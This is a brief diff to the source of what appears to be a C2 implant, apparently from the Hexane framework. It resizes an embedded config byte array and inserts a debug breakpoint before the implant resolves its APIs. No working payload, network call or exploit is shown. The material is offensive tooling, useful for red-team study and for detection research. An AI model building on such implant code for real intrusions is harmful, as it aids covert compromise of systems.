@@ -6,11 +6,12 @@ VOID Entrypoint(HMODULE Base) {
 }
 
 namespace Implant {
-    TXT_SECTION(F) BYTE ConfigBytes[1024] = { 0xDE,0xAD,0xBE,0xEF,0xDE,0xAD,0xBE,0xEF, };
+    TXT_SECTION(F) BYTE ConfigBytes[576] = { 0xDE,0xAD,0xBE,0xEF,0xDE,0xAD,0xBE,0xEF, };
 
     VOID MainRoutine() {
         HEXANE
 
+        __debugbreak();
         Memory::ResolveApi();
         if (ntstatus != ERROR_SUCCESS) {
             return_defer(ntstatus);
